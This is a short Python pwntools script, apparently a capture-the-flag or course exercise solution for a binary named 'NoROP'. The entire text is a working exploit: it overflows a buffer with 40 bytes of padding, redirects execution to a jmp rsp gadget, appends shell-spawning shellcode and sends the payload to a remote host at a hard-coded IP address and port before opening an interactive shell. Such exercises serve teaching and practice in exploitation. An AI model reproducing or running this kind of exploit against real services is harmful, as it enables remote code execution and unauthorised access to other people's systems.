from pwn import *

context.arch = 'amd64'  # This is crucial!

# r = process("ptm_pwn/NoROP")
r = remote("130.192.5.212", 17386)

padding = b'a' * 40

jmp_rsp = p64(0x4011c3)

shellcode = asm(shellcraft.sh())

payload = padding + jmp_rsp + shellcode

r.sendline(payload)
r.interactive()